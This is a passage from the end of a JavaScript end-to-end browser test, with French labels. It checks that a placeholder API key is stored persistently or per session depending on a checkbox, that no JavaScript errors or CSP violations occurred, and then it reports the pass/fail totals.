  ok(JSON.parse(k2.ls || "{}").key === "sk-ant-test" && !k2.ss && k3.ss === "sk-ant-test" && !/sk-ant/.test(k3.ls || ""),
    L("clé : « garder sur ce téléphone » coché → stockage durable ; décoché → session seulement") + ` — ${JSON.stringify([k2, k3])}`);
  ok(errors.length === 0, L(`aucune erreur JavaScript${errors.length ? " — " + errors.join(" | ") : ""}`));
  await ctx.close();
}

ok(cspViolations.length === 0, `sécurité : aucune violation CSP sur l'ensemble des parcours` + (cspViolations.length ? " — " + cspViolations.slice(0, 3).join(" | ") : ""));
await browser.close(); server.close();
const fails = results.filter((r) => !r[0]);
for (const [c, l] of results) console.log(`${c ? "  ✓" : "  ✗"} ${l}`);
console.log(`\nE2E : ${results.length - fails.length}/${results.length}`);
process.exit(fails.length ? 1 : 0);
